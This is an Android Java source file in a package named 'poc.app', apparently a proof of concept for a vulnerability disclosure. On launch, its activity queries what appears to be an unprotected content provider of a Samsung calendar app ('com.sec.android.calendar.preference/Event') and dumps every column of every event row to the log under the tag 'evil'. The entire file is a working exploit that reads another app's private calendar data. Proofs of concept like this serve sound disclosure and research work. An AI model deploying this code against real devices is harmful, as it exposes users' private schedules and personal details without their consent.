package poc.app;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://com.sec.android.calendar.preference/Event");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if(sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
    }
}